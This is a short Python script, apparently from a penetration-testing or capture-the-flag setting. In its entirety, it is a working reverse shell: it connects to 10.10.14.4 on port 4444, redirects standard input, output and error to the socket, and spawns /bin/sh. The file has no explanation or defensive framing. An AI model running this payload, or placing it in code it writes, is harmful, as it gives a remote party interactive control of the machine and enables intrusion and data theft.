#!/usr/bin/env python
import sys,socket,os,pty
s=socket.socket()
s.connect(("10.10.14.4",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
